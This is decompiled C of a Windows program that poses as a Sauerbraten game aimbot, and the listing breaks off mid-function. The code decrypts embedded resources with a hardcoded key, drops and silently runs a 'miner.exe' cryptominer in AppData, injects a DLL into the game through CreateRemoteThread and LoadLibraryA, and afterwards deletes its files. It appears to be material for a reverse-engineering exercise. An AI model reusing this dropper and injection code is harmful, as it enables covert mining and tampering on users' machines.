//----- (000000013F921E80) ----------------------------------------------------
_BOOL8 __fastcall inject_dll(HANDLE hProcess, char *Str)
{
  SIZE_T v4; // rax
  void *v5; // rdi
  SIZE_T v6; // rax
  HMODULE ModuleHandleA; // rax
  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // rax

  v4 = strlen(Str);
  v5 = VirtualAllocEx(hProcess, 0i64, v4, 0x3000u, 0x40u);
  if ( v5
    && (v6 = strlen(Str), WriteProcessMemory(hProcess, v5, Str, v6, 0i64))
    && (ModuleHandleA = GetModuleHandleA("kernel32.dll"),
        (LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(ModuleHandleA, "LoadLibraryA")) != 0i64) )
  {
    return CreateRemoteThread(hProcess, 0i64, 0i64, (LPTHREAD_START_ROUTINE)LoadLibraryA, v5, 0, 0i64) != 0i64;
  }
  else
  {
    return 0i64;
  }
}

//----- (000000013F921F50) ----------------------------------------------------
char *__fastcall sub_13F921F50(void *Src, size_t Size)
{
  char *v4; // rbp
  char *v5; // rbx
  size_t v6; // rdi
  __int64 v7; // rdx
  char v9[232]; // [rsp+20h] [rbp-E8h] BYREF

  v4 = (char *)malloc(Size);
  memcpy(v4, Src, Size);
  sub_13F921BA0((__int64)v9, (__int64)"yummyvitamincjoy");
  if ( Size )
  {
    v5 = v4;
    v6 = (size_t)&v4[((Size - 1) & 0xFFFFFFFFFFFFFFF0ui64) + 16];
    do
    {
      v7 = (__int64)v5;
      v5 += 16;
      sub_13F921C00((__int64)v9, v7);
    }
    while ( v5 != (char *)v6 );
  }
  return v4;
}

//----- (000000013F921FD0) ----------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HWND Window; // rax
  MSG Msg; // [rsp+60h] [rbp-A8h] BYREF
  WNDCLASSEXA v9; // [rsp+90h] [rbp-78h] BYREF

  v9.lpfnWndProc = (WNDPROC)sub_13F922AF0;
  v9.hInstance = hInstance;
  v9.lpszClassName = ClassName;
  *(_QWORD *)&v9.cbSize = 0x800000050i64;
  v9.hIcon = LoadIconA(0i64, (LPCSTR)0x7F00);
  v9.hIconSm = LoadIconA(0i64, (LPCSTR)0x7F00);
  v9.lpszMenuName = 0i64;
  v9.hCursor = LoadCursorA(0i64, (LPCSTR)0x7F00);
  *(_QWORD *)&v9.cbClsExtra = 0i64;
  v9.hbrBackground = (HBRUSH)1;
  if ( !RegisterClassExA(&v9) )
    return 0;
  Window = CreateWindowExA(
             0,
             ClassName,
             "BananaAimBot",
             0xCF0000u,
             0x80000000,
             0x80000000,
             400,
             150,
             0i64,
             0i64,
             hInstance,
             0i64);
  ShowWindow(Window, nShowCmd);
  while ( GetMessageA(&Msg, 0i64, 0, 0) )
  {
    TranslateMessage(&Msg);
    DispatchMessageA(&Msg);
  }
  return Msg.wParam;
}

//----- (000000013F922150) ----------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_13F922150()
{
  HANDLE FileA; // rax MAPDST
  DWORD LowPart; // r14d
  void *file_contents; // rax MAPDST
  CHAR *v5; // rax
  int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // eax
  HANDLE v9; // rdi
  HRSRC ResourceA; // rax
  HGLOBAL Resource; // rax
  void *v12; // rax
  char *v13; // rax
  BOOL v14; // eax
  void *v15; // rcx
  __int64 v16; // rax
  __int64 v17; // rax
  void *v18; // rax
  char *v19; // rax
  int v20; // eax
  DWORD *v21; // rdi
  __int64 v22; // rcx
  __int64 v23; // rcx
  struct _PROCESS_INFORMATION *v24; // rdi
  void *v25; // rax
  void *v26; // rdi
  __int64 v27; // rax
  unsigned int v28; // esi
  __int64 v29; // rax
  void *v30; // rax
  struct _SHFILEOPSTRUCTA *v31; // rdi
  __int64 v32; // rcx
  unsigned int v33; // eax
  struct _PROCESS_INFORMATION *v34; // rdi
  __int64 v35; // rcx
  unsigned int v36; // [rsp+58h] [rbp-1A50h]
  unsigned int v37; // [rsp+58h] [rbp-1A50h]
  HMODULE ModuleHandleA; // [rsp+60h] [rbp-1A48h]
  DWORD v39; // [rsp+68h] [rbp-1A40h]
  DWORD v40; // [rsp+68h] [rbp-1A40h]
  __int64 v41; // [rsp+68h] [rbp-1A40h]
  __int64 v42; // [rsp+68h] [rbp-1A40h]
  HRSRC v43; // [rsp+70h] [rbp-1A38h]
  DWORD v44; // [rsp+ACh] [rbp-19FCh] BYREF
  DWORD v45; // [rsp+B0h] [rbp-19F8h] BYREF
  DWORD v46; // [rsp+B4h] [rbp-19F4h] BYREF
  LARGE_INTEGER v47; // [rsp+B8h] [rbp-19F0h] BYREF
  struct _PROCESS_INFORMATION v48; // [rsp+C0h] [rbp-19E8h] BYREF
  struct _PROCESS_INFORMATION v49; // [rsp+E0h] [rbp-19C8h] BYREF
  char v50[64]; // [rsp+100h] [rbp-19A8h] BYREF
  struct _SHFILEOPSTRUCTA v51; // [rsp+140h] [rbp-1968h] BYREF
  __int64 md5[14]; // [rsp+180h] [rbp-1928h] BYREF
  struct _STARTUPINFOA v53; // [rsp+1F0h] [rbp-18B8h] BYREF
  CHAR v54[1024]; // [rsp+260h] [rbp-1848h] BYREF
  CHAR v55[1024]; // [rsp+660h] [rbp-1448h] BYREF
  CHAR v56[1024]; // [rsp+A60h] [rbp-1048h] BYREF
  char v57[1024]; // [rsp+E60h] [rbp-C48h] BYREF
  char v58[1024]; // [rsp+1260h] [rbp-848h] BYREF
  char aimbot_path[1064]; // [rsp+1660h] [rbp-448h] BYREF

  sub_13F924650();
  strcpy(v50, "%PROGRAMFILES(X86)%\\Sauerbraten\\bin64\\sauerbraten.exe");
  ExpandEnvironmentStringsA(v50, v54, 0x400u);
  ExpandEnvironmentStringsA("%PROGRAMFILES(X86)%\\Sauerbraten", v55, 0x400u);
  FileA = CreateFileA(v54, 0x80000000, 1u, 0i64, 3u, 0x80u, 0i64);
  if ( FileA != (HANDLE)-1i64 )
  {
    if ( !GetFileSizeEx(FileA, &v47) || (LowPart = v47.LowPart, (file_contents = malloc(v47.QuadPart)) == 0i64) )
    {
      CloseHandle(FileA);
      return;
    }
    if ( !ReadFile(FileA, file_contents, LowPart, &v44, 0i64) )
    {
      CloseHandle(FileA);
      free(file_contents);
      return;
    }
    CloseHandle(FileA);
    sub_13F922C60(md5);
    sub_13F922DB0(md5, (__int64)file_contents, v44);
    sub_13F922E90(md5);
    free(file_contents);
    memset(v56, 0, sizeof(v56));
    ExpandEnvironmentStringsA("%APPDATA%\\BananaBot", v56, 0x400u);
    v5 = v56;
    do
    {
      v6 = *(_DWORD *)v5;
      v5 += 4;
      v7 = ~v6 & (v6 - 16843009) & 0x80808080;
    }
    while ( !v7 );
    if ( (~v6 & (v6 - 16843009) & 0x8080) == 0 )
      LOBYTE(v7) = (~v6 & (v6 - 16843009) & 0x80808080) >> 16;
    if ( (~v6 & (v6 - 16843009) & 0x8080) == 0 )
      LODWORD(v5) = (_DWORD)v5 + 2;
    v8 = (_DWORD)v5 - (__CFADD__((_BYTE)v7, (_BYTE)v7) + 3) - (unsigned int)v56;
    v56[v8] = 0;
    v56[v8 + 1] = 0;
    CreateDirectoryA(v56, 0i64);
    strcpy(v57, v56);
    strcpy(v58, v56);
    strcpy(aimbot_path, v56);
    strcat(v57, "\\miner.exe");
    strcat(v58, "\\config.json");
    strcat(aimbot_path, "\\aimbot.dll");
    v9 = CreateFileA(v57, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
    if ( v9 != (HANDLE)-1i64 )
    {
      ModuleHandleA = GetModuleHandleA(0i64);
      ResourceA = FindResourceA(ModuleHandleA, (LPCSTR)1, (LPCSTR)0xA);
      if ( !ResourceA )
        goto LABEL_21;
      v43 = ResourceA;
      v39 = SizeofResource(ModuleHandleA, ResourceA);
      if ( !v39 )
        goto LABEL_21;
      Resource = LoadResource(ModuleHandleA, v43);
      if ( !Resource )
        goto LABEL_21;
      v12 = LockResource(Resource);
      v13 = sub_13F921F50(v12, v39);
      v40 = v39 - 42;
      v14 = WriteFile(v9, v13 + 42, v40, &v45, 0i64);
      v15 = v9;
      if ( !v14 || v40 != v45 )
        goto LABEL_19;
      CloseHandle(v9);
      v9 = CreateFileA(v58, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
      if ( v9 != (HANDLE)-1i64 )
      {
        v16 = ((__int64 (__fastcall *)(HMODULE, __int64, __int64))FindResourceA)(ModuleHandleA, 2i64, 10i64);
        if ( v16 )
        {
          v41 = v16;
          v36 = ((__int64 (__fastcall *)(HMODULE, __int64))SizeofResource)(ModuleHandleA, v16);
          if ( v36 )
          {
            v17 = ((__int64 (__fastcall *)(HMODULE, __int64))LoadResource)(ModuleHandleA, v41);
            if ( v17 )
            {
              v18 = (void *)((__int64 (__fastcall *)(__int64))LockResource)(v17);
              v19 = sub_13F921F50(v18, v36);
              v37 = v36 - 50;
              v20 = ((__int64 (__fastcall *)(HANDLE, char *, _QWORD, DWORD *, _QWORD))WriteFile)(
                      v9,
                      v19 + 42,
                      v37,
                      &v45,
                      0i64);
              v15 = v9;
              if ( !v20 || v37 != v45 )
              {
LABEL_19:
                CloseHandle(v15);
                return;
              }
              CloseHandle(v9);
              v21 = &v53.cb + 1;
              v22 = 25i64;
              v53.cb = 104;
              while ( v22 )
              {
                *v21++ = 0;
                --v22;
              }
              v23 = 6i64;
              v24 = &v48;
              while ( v23 )
              {
                LODWORD(v24->hProcess) = 0;
                v24 = (struct _PROCESS_INFORMATION *)((char *)v24 + 4);
                --v23;
              }
              if ( !CreateProcessA(v57, 0i64, 0i64, 0i64, 0, 0, 0i64, v56, &v53, &v48) )
              {
                TerminateProcess(v48.hProcess, 0);
                v32 = 12i64;
                v31 = &v51;
                v33 = 0;
                goto LABEL_41;
              }
              v25 = sub_13F921DA0();
              if ( !v25 )
              {
                TerminateProcess(v48.hProcess, 0);
                return;
              }
              v26 = v25;
              v27 = ((__int64 (__fastcall *)(HMODULE, __int64, __int64, _QWORD, int, int, _QWORD))FindResourceA)(
                      ModuleHandleA,
                      3i64,
                      10i64,
                      0i64,
                      2,
                      128,
                      0i64);
              if ( v27 )
              {
                v42 = v27;
                v28 = ((__int64 (__fastcall *)(HMODULE, __int64))SizeofResource)(ModuleHandleA, v27);
                if ( !v28 )
                  goto LABEL_46;
                v29 = ((__int64 (__fastcall *)(HMODULE, __int64))LoadResource)(ModuleHandleA, v42);
                if ( v29 )
                {
                  v30 = (void *)((__int64 (__fastcall *)(__int64))LockResource)(v29);
                  sub_13F921F50(v30, v28);
                  v34 = &v49;
                  v35 = 6i64;
                  v53.cb = 104;
                  while ( v35 )
                  {
                    LODWORD(v34->hProcess) = 0;
                    v34 = (struct _PROCESS_INFORMATION *)((char *)v34 + 4);
                    --v35;
                  }
                  if ( !CreateProcessA(v54, 0i64, 0i64, 0i64, 0, 0, 0i64, v55, &v53, &v49) )
                    return;
                  Sleep(0x1388u);
                  v28 = inject_dll(v49.hProcess, aimbot_path);
                  if ( v28 )
                  {
                    v46 = 0;
                    do
                    {
                      Sleep(0x3E8u);
                      if ( !GetExitCodeProcess(v49.hProcess, &v46) )
                      {
                        v28 = 0;
                        goto LABEL_46;
                      }
                    }
                    while ( v46 == 259 );
                    TerminateProcess(v48.hProcess, 0);
                    CloseHandle(v48.hProcess);
                    Sleep(0x3E8u);
                    goto LABEL_40;
                  }
LABEL_46:
                  TerminateProcess(v48.hProcess, 0);
                  v31 = &v51;
                  v32 = 12i64;
                  v33 = v28;
                  goto LABEL_41;
                }
              }
              CloseHandle(v26);
              TerminateProcess(v48.hProcess, 0);
LABEL_40:
              v31 = &v51;
              v32 = 12i64;
              v33 = 0;
LABEL_41:
              while ( v32 )
              {
                LODWORD(v31->hwnd) = v33;
                v31 = (struct _SHFILEOPSTRUCTA *)((char *)v31 + 4);
                --v32;
              }
              v51.wFunc = 3;
              v51.pTo = (PCZZSTR)&unk_13F9262E5;
              v51.fFlags = 1044;
              v51.lpszProgressTitle = (PCSTR)&unk_13F9262E5;
              v51.pFrom = v56;
              SHFileOperationA(&v51);
              return;
            }
          }
        }
LABEL_21:
        CloseHandle(v9);
      }
    }
  }
}
// 13F92232B: positive sp value 1A68 has been found

//----- (000000013F922AF0) ----------------------------------------------------
LRESULT __fastcall sub_13F922AF0(HWND hWndParent, UINT a2, WPARAM a3, HGDIOBJ a4)
{
  HINSTANCE hInstance; // rax
  HINSTANCE WindowLongPtrA; // rax

  if ( a2 == 2 )
  {
    DeleteObject(ho);
    PostQuitMessage(0);
    return 0i64;
  }
  if ( a2 == 273 )
  {
    if ( ho == a4 && (a3 & 0xFFFF0000) == 0 )
    {
      ShowWindow(hWndParent, 0);
      sub_13F922150();
      ExitProcess(0);
    }
    return 0i64;
  }
  if ( a2 != 1 )
    return DefWindowProcA(hWndParent, a2, a3, (LPARAM)a4);
  hInstance = (HINSTANCE)GetWindowLongPtrA(hWndParent, -6);
  ho = CreateWindowExW(
         0,
         L"BUTTON",
         L"Launch Sauerbraten with Aimbot!",
         0x50010001u,
         10,
         70,
         300,
         30,
         hWndParent,
         0i64,
         hInstance,
         0i64);
  WindowLongPtrA = (HINSTANCE)GetWindowLongPtrA(hWndParent, -6);
  window = (__int64)CreateWindowExW(
                      0,
                      L"STATIC",
                      L"BEST Sauerbraten aimbot by Potassium Crew\n"
                       "Ad-supported please do not reverse engineer or modify",
                      0x50000000u,
                      0,
                      0,
                      350,
                      50,
                      hWndParent,
                      0i64,
                      WindowLongPtrA,
                      0i64);
  return 0i64;
}
// 13F929030: using guessed type __int64 window;

//----- (000000013F922C50) ----------------------------------------------------
__int64 __fastcall sub_402C50(int a1, char a2)
{
  return (unsigned int)__ROL4__(a1, a2);
}

//----- (000000013F922C60) ----------------------------------------------------
__int64 __fastcall sub_402C60(_QWORD *a1)
{
  __int64 result; // rax

  a1[1] = 0xEFCDAB8967452301ui64;
  result = 0x1032547698BADCFEi64;
  *a1 = 0i64;
  a1[2] = 0x1032547698BADCFEi64;
  return result;
}

//----- (000000013F922C90) ----------------------------------------------------
__int64 __fastcall sub_13F922C90(_DWORD *a1, __int64 a2)
{
  __int64 v2; // r9
  int v3; // r14d
  int v4; // r11d
  int v5; // ebx
  int v6; // esi
  _DWORD *v7; // r13
  int v8; // edi
  int v9; // r8d
  int v10; // eax
  __int64 v11; // r10
  __int64 result; // rax
  unsigned int v13; // eax
  int v14; // [rsp+4h] [rbp-54h]
  int v15; // [rsp+8h] [rbp-50h]
  int v16; // [rsp+Ch] [rbp-4Ch]

  v2 = 0i64;
  v3 = *a1;
  v4 = a1[1];
  v5 = a1[2];
  v16 = a1[3];
  v6 = v16;
  v7 = a1;
  v8 = *a1;
  LOBYTE(a1) = 7;
  v9 = -680876936;
  v14 = v4;
  v15 = v5;
  while ( 1 )
  {
    v11 = (unsigned int)v2;
    v13 = (unsigned int)v2 >> 4;
    if ( (unsigned int)v2 >> 4 == 1 )
    {
      v11 = (5 * (_BYTE)v2 + 1) & 0xF;
      v10 = v5 ^ v6 & (v5 ^ v4);
    }
    else if ( v13 )
    {
      if ( v13 == 2 )
      {
        v11 = (3 * (_BYTE)v2 + 5) & 0xF;
        v10 = v6 ^ v5 ^ v4;
      }
      else
      {
        v10 = v5 ^ (v4 | ~v6);
        v11 = (7 * (_BYTE)v2) & 0xF;
      }
    }
    else
    {
      v10 = v6 ^ v4 & (v6 ^ v5);
    }
    ++v2;
    result = (unsigned int)(v4 + __ROL4__(v9 + v8 + *(_DWORD *)(a2 + 4 * v11) + v10, (char)a1));
    if ( v2 == 64 )
      break;
    LODWORD(a1) = dword_13F926520[v2];
    v8 = v6;
    v6 = v5;
    v5 = v4;
    v9 = md5_consts[v2];
    v4 = result;
  }
  *v7 = v3 + v6;
  v7[2] = v15 + v4;
  v7[1] = v14 + result;
  v7[3] = v16 + v5;
  return result;
}
// 13F926420: using guessed type _DWORD md5_consts[64];
// 13F926520: using guessed type _DWORD dword_13F926520[64];

//----- (000000013F922DB0) ----------------------------------------------------
__int64 __fastcall sub_13F922DB0(__int64 *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 result; // rax
  __int64 v5; // rbx
  unsigned int v8; // r12d
  __int64 v9; // rdx
  __int64 *v10; // rdi
  __int64 *v11; // rdx
  char *v12; // rcx
  int v13; // eax
  char v14[64]; // [rsp+20h] [rbp-88h] BYREF
  char v15; // [rsp+60h] [rbp-48h] BYREF

  result = a3 + *a1;
  v5 = *a1 & 0x3F;
  *a1 = result;
  if ( a3 )
  {
    v8 = 0;
    v9 = 0i64;
    v10 = a1 + 1;
    do
    {
      while ( 1 )
      {
        result = (unsigned int)(v5 + 1);
        *((_BYTE *)a1 + (unsigned int)v5 + 24) = *(_BYTE *)(a2 + v9);
        LODWORD(v5) = ((_BYTE)v5 + 1) & 0x3F;
        if ( !(_DWORD)v5 )
          break;
        LODWORD(v5) = result;
        v9 = ++v8;
        if ( v8 >= a3 )
          return result;
      }
      v11 = a1 + 3;
      v12 = v14;
      do
      {
        v13 = *((unsigned __int8 *)v11 + 3);
        v12 += 4;
        v11 = (__int64 *)((char *)v11 + 4);
        *((_DWORD *)v12 - 1) = (*((unsigned __int8 *)v11 - 3) << 8) | *((unsigned __int8 *)v11 - 4) | (*((unsigned __int8 *)v11 - 2) << 16) | (v13 << 24);
      }
      while ( &v15 != v12 );
      result = sub_13F922C90(v10, (__int64)v14);
      v9 = ++v8;
    }
    while ( v8 < a3 );
  }
  return result;
}

//----- (000000013F922E90) ----------------------------------------------------
__int64 __fastcall sub_13F922E90(__int64 *a1)
{
  unsigned int v1; // eax
  unsigned __int64 v3; // rsi
  __int64 *v4; // r9
  __int64 v5; // r11
  __int64 *v6; // rsi
  __int64 *v7; // r8
  int v8; // eax
  __int64 *v9; // rbx
  unsigned int v10; // eax
  unsigned int v11; // edx
  __int64 result; // rax
  char v13[56]; // [rsp+20h] [rbp-58h] BYREF
  __int64 v14; // [rsp+58h] [rbp-20h] BYREF

  v1 = *(_DWORD *)a1 & 0x3F;
  if ( v1 > 0x37 )
    v3 = 120 - v1;
  else
    v3 = 56 - v1;
  sub_13F922DB0(a1, (__int64)&unk_13F925020, v3);
  v4 = (__int64 *)v13;
  v5 = *a1 - v3;
  v6 = a1 + 3;
  *a1 = v5;
  v7 = a1 + 3;
  do
  {
    v8 = *((unsigned __int8 *)v7 + 3);
    v4 = (__int64 *)((char *)v4 + 4);
    v7 = (__int64 *)((char *)v7 + 4);
    *((_DWORD *)v4 - 1) = (*((unsigned __int8 *)v7 - 3) << 8) | *((unsigned __int8 *)v7 - 4) | (*((unsigned __int8 *)v7
                                                                                                - 2) << 16) | (v8 << 24);
  }
  while ( &v14 != v4 );
  v9 = a1 + 1;
  v14 = 8 * v5;
  sub_13F922C90(v9, (__int64)v13);
  do
  {
    v10 = *(_DWORD *)v9;
    v9 = (__int64 *)((char *)v9 + 4);
    *((_WORD *)v9 + 38) = v10;
    v11 = HIWORD(v10);
    result = HIBYTE(v10);
    *((_BYTE *)v9 + 78) = v11;
    *((_BYTE *)v9 + 79) = result;
  }
  while ( v6 != v9 );
  return result;
}

//----- (000000013F922F70) ----------------------------------------------------
__int64 __fastcall sub_13F922F70(const char *a1, __m128i *a2)
{
  unsigned __int64 v4; // rax
  __int64 result; // rax
  __int64 v6[11]; // [rsp+20h] [rbp-88h] BYREF
  __m128i v7[3]; // [rsp+78h] [rbp-30h] BYREF

  v6[1] = 0xEFCDAB8967452301ui64;
  v6[0] = 0i64;
  v6[2] = 0x1032547698BADCFEi64;
  v4 = strlen(a1);
  sub_13F922DB0(v6, (__int64)a1, v4);
  result = sub_13F922E90(v6);
  *a2 = _mm_loadu_si128(v7);
  return result;
}
// 13F922F70: using guessed type __m128i var_30[3];

//----- (000000013F922FE0) ----------------------------------------------------
void __fastcall sub_13F922FE0(FILE *Stream, __m128i *a2)
{
  void *v4; // rbx
  unsigned __int64 v5; // r8
  __int64 v6[11]; // [rsp+20h] [rbp-98h] BYREF
  __m128i v7[4]; // [rsp+78h] [rbp-40h] BYREF

  v6[0] = 0i64;
  v4 = malloc(0x400ui64);
  v6[1] = 0xEFCDAB8967452301ui64;
  v6[2] = 0x1032547698BADCFEi64;
  while ( 1 )
  {
    v5 = fread(v4, 1ui64, 0x400ui64, Stream);
    if ( !v5 )
      break;
    sub_13F922DB0(v6, (__int64)v4, v5);
  }
  sub_13F922E90(v6);
  free(v4);
  *a2 = _mm_loadu_si128(v7);
}
// 13F922FE0: using guessed type __m128i var_40[4];

//----- (000000013F9231D0) ----------------------------------------------------
void (*sub_13F9231D0())(void)
{
  void (*result)(void); // rax

  result = *(void (**)(void))off_13F925060;
  if ( *(_QWORD *)off_13F925060 )
  {
    do
    {
      result();
      result = (void (*)(void))*((_QWORD *)off_13F925060 + 1);
      off_13F925060 = (char *)off_13F925060 + 8;
    }
    while ( result );
  }
  return result;
}
// 13F925060: using guessed type void *off_13F925060;

//----- (000000013F923210) ----------------------------------------------------
__int64 sub_13F923210()
{
  unsigned int i; // eax
  void (**v1)(void); // rbx
  void (**v2)(void); // rsi

  i = *(_QWORD *)off_13F926920;
  if ( i == -1 )
  {
    for ( i = 0; *((_QWORD *)off_13F926920 + i + 1); ++i )
      ;
  }
  if ( i )
  {
    v1 = (void (**)(void))((char *)off_13F926920 + 8 * i);
    v2 = (void (**)(void))((char *)off_13F926920 + 8 * (i - (unsigned __int64)(i - 1)) - 8);
    do
      (*v1--)();
    while ( v1 != v2 );
  }
  return sub_13F921510((int (__cdecl *)())sub_13F9231D0);
}
// 13F923210: using guessed type __int64 __fastcall sub_13F923210();
// 13F926920: using guessed type void *off_13F926920;

//----- (000000013F923280) ----------------------------------------------------
__int64 sub_13F923280()
{
  __int64 result; // rax

  result = (unsigned int)dword_13F929040;
  if ( !dword_13F929040 )
  {
    dword_13F929040 = 1;
    return sub_13F923210();
  }
  return result;
}
// 13F923210: using guessed type __int64 sub_13F923210(void);
// 13F923280: using guessed type __int64 __fastcall sub_13F923280();
// 13F929040: using guessed type int dword_13F929040;

//----- (000000013F9232B0) ----------------------------------------------------
__int64 sub_13F9232B0()
{
  return 0i64;
}
// 13F9232B0: using guessed type __int64 __fastcall sub_13F9232B0();

//----- (000000013F9232C0) ----------------------------------------------------
LONGLONG sub_13F9232C0()
{
  __int64 v0; // rbx
  LONGLONG result; // rax
  struct _FILETIME v2; // rsi
  DWORD CurrentProcessId; // r12d
  DWORD CurrentThreadId; // ebp
  DWORD TickCount; // edi
  unsigned __int64 v6; // rdx
  struct _FILETIME SystemTimeAsFileTime; // [rsp+20h] [rbp-38h] BYREF
  LARGE_INTEGER PerformanceCount; // [rsp+28h] [rbp-30h] BYREF

  v0 = qword_13F925100;
  result = 0x2B992DDFA232i64;
  SystemTimeAsFileTime = 0i64;
  if ( qword_13F925100 == 0x2B992DDFA232i64 )
  {
    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
    v2 = SystemTimeAsFileTime;
    CurrentProcessId = GetCurrentProcessId();
    CurrentThreadId = GetCurrentThreadId();
    TickCount = GetTickCount();
    QueryPerformanceCounter(&PerformanceCount);
    result = (PerformanceCount.QuadPart ^ *(_QWORD *)&v2 ^ CurrentProcessId ^ CurrentThreadId ^ TickCount) & 0xFFFFFFFFFFFFi64;
    if ( result == v0 )
    {
      v6 = 0xFFFFD466D2205DCCui64;
      result = 0x2B992DDFA233i64;
    }
    else
    {
      v6 = ~result;
    }
    qword_13F925100 = result;
    qword_13F925110 = v6;
  }
  else
  {
    qword_13F925110 = ~qword_13F925100;
  }
  return result;
}
// 13F925100: using guessed type __int64 qword_13F925100;
// 13F925110: using guessed type __int64 qword_13F925110;

//----- (000000013F9233A0) ----------------------------------------------------
void __fastcall __noreturn sub_13F9233A0(DWORD64 a1)
{
  DWORD64 Rip; // rbx
  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v3; // rax
  HANDLE CurrentProcess; // rax
  unsigned __int64 ImageBase; // [rsp+48h] [rbp-28h] BYREF
  unsigned __int64 EstablisherFrame; // [rsp+50h] [rbp-20h] BYREF
  PVOID HandlerData[4]; // [rsp+58h] [rbp-18h] BYREF
  char vars8; // [rsp+78h] [rbp+8h] BYREF
  DWORD64 retaddr; // [rsp+88h] [rbp+18h]

  RtlCaptureContext(&ContextRecord);
  Rip = ContextRecord.Rip;
  v3 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, 0i64);
  if ( v3 )
  {
    RtlVirtualUnwind(0, ImageBase, Rip, v3, &ContextRecord, HandlerData, &EstablisherFrame, 0i64);
  }
  else
  {
    ContextRecord.Rip = retaddr;
    ContextRecord.Rsp = (DWORD64)&vars8;
  }
  ContextRecord.Rcx = a1;
  qword_13F929550 = ContextRecord.Rip;
  qword_13F929540 = 0x1C0000409i64;
  HandlerData[1] = (PVOID)qword_13F925100;
  HandlerData[2] = (PVOID)qword_13F925110;
  SetUnhandledExceptionFilter(0i64);
  UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo);
  CurrentProcess = GetCurrentProcess();
  TerminateProcess(CurrentProcess, 0xC0000409);
  abort();
}
// 13F925100: using guessed type __int64 qword_13F925100;
// 13F925110: using guessed type __int64 qword_13F925110;
// 13F929540: using guessed type __int64 qword_13F929540;
// 13F929550: using guessed type __int64 qword_13F929550;

//----- (000000013F9234A0) ----------------------------------------------------
__int64 __fastcall TlsCallback_1(__int64 a1, int a2)
{
  if ( a2 != 3 && a2 )
    return 1i64;
  sub_13F924190(a1, a2);
  return 1i64;
}

//----- (000000013F9234D0) ----------------------------------------------------
__int64 __fastcall TlsCallback_0(__int64 a1, int a2)
{
  if ( *(_DWORD *)off_13F926900 != 2 )
    *(_DWORD *)off_13F926900 = 2;
  if ( a2 == 2 || a2 != 1 )
    return 1i64;
  sub_13F924190(a1, 1);
  return 1i64;
}
// 13F926900: using guessed type void *off_13F926900;

//----- (000000013F923550) ----------------------------------------------------
__int64 sub_13F923550()
{
  return 0i64;
}
// 13F923550: using guessed type __int64 __fastcall sub_13F923550();

//----- (000000013F923560) ----------------------------------------------------
__int64 (__fastcall *__fastcall sub_13F923560(int a1, __int64 a2, double a3, double a4, __int64 a5))(_QWORD)
{
  __int64 (__fastcall *result)(_QWORD); // rax
  int v6; // [rsp+20h] [rbp-38h] BYREF
  __int64 v7; // [rsp+28h] [rbp-30h]
  double v8; // [rsp+30h] [rbp-28h]
  double v9; // [rsp+38h] [rbp-20h]
  __int64 v10; // [rsp+40h] [rbp-18h]

  result = qword_13F929600;
  if ( qword_13F929600 )
  {
    v6 = a1;
    v7 = a2;
    v8 = a3;
    v9 = a4;
    v10 = a5;
    return (__int64 (__fastcall *)(_QWORD))qword_13F929600(&v6);
  }
  return result;
}
// 13F929600: using guessed type __int64 (__fastcall *qword_13F929600)(_QWORD);

//----- (000000013F9235B0) ----------------------------------------------------
void __fastcall sub_13F9235B0(_UserMathErrorFunctionPointer UserMathErrorFunction)
{
  qword_13F929600 = (__int64 (__fastcall *)(_QWORD))UserMathErrorFunction;
  _setusermatherr(UserMathErrorFunction);
}
// 13F929600: using guessed type __int64 (__fastcall *qword_13F929600)(_QWORD);

//----- (000000013F9235C0) ----------------------------------------------------
__int64 __fastcall sub_13F9235C0(__int64 a1)
{
  const char *v1; // rbx
  const char *v2; // rsi
  double v3; // xmm8_8
  double v4; // xmm7_8
  double v5; // xmm6_8
  FILE *v6; // rax

  switch ( *(_DWORD *)a1 )
  {
    case 1:
      v1 = "Argument domain error (DOMAIN)";
      break;
    case 2:
      v1 = "Argument singularity (SIGN)";
      break;
    case 3:
      v1 = "Overflow range error (OVERFLOW)";
      break;
    case 4:
      v1 = "The result is too small to be represented (UNDERFLOW)";
      break;
    case 5:
      v1 = "Total loss of significance (TLOSS)";
      break;
    case 6:
      v1 = "Partial loss of significance (PLOSS)";
      break;
    default:
      v1 = "Unknown error";
      break;
  }
  v2 = *(const char **)(a1 + 8);
  v3 = *(double *)(a1 + 32);
  v4 = *(double *)(a1 + 24);
  v5 = *(double *)(a1 + 16);
  v6 = sub_13F924750(2);
  fprintf(v6, "_matherr(): %s in %s(%g, %g)  (retval=%g)\n", v1, v2, v5, v4, v3);
  return 0i64;
}

//----- (000000013F9236C0) ----------------------------------------------------
void sub_13F9236C0()
{
  __asm { fninit }
}

//----- (000000013F9236D0) ----------------------------------------------------
__int64 __fastcall sub_13F9236D0(__int64 a1)
{
  return a1;
}

//----- (000000013F9236E0) ----------------------------------------------------
__int64 __fastcall sub_13F9236E0(__int64 a1)
{
  return a1;
}

//----- (000000013F9236F0) ----------------------------------------------------
int __fastcall sub_13F9236F0(_DWORD *a1, _DWORD *a2, unsigned int a3)
{
  __int64 v3; // rsi
  int v7; // ecx
  __int64 v8; // rax
  __int64 v9; // r12
  __int64 v10; // rsi
  __int64 v11; // rax
  const void *v12; // rcx
  unsigned int v13; // edi
  unsigned int v14; // edi
  __int64 v15; // rdx
  __int64 v16; // rsi
  PVOID BaseAddress; // rcx
  SIZE_T RegionSize; // rdx
  DWORD LastError; // eax
  struct _MEMORY_BASIC_INFORMATION Buffer; // [rsp+20h] [rbp-58h] BYREF

  v3 = dword_13F929624;
  if ( dword_13F929624 <= 0 )
  {
    v3 = 0i64;
LABEL_6:
    v9 = sub_13F924390();
    if ( !v9 )
      sub_13F9248B0("Address %p has no image-section", a1);
    v10 = 40 * v3;
    v11 = v10 + qword_13F929628;
    *(_QWORD *)(v11 + 32) = v9;
    *(_DWORD *)v11 = 0;
    v12 = (const void *)(sub_13F9244C0() + *(unsigned int *)(v9 + 12));
    *(_QWORD *)(qword_13F929628 + v10 + 24) = v12;
    if ( !VirtualQuery(v12, &Buffer, 0x30ui64) )
      sub_13F9248B0(
